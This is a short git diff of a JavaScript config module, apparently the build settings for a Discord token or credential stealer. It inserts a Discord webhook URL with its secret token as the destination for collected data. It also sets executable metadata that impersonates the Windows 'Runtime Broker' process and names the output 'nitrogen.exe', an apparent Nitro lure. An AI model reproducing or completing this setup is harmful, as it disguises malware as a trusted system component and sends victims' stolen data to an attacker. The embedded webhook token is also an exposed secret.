@@ -1,12 +1,12 @@
 module.exports = () => {
     return {
-        webhook_url: "REPLACE_ME",
+        webhook_url: "https://discord.com/api/webhooks/1113852595606392974/YAwwFLN9ZDpmsDvbbINoZYRGepTbsGiwbq6uam6jXIKAXE7efQxTLhvumkFqMTlL6_ur",
         icon: './default.ico',
         properties: {
             FileDescription: 'Runtime Broker',
             ProductName: 'Runtime Broker',
             LegalCopyright: 'Runtime Broker ©️ 2023',
-            OriginalFilename: 'RuntimeBroker.exe'
+            OriginalFilename: 'nitrogen.exe'
         }
     }
 }
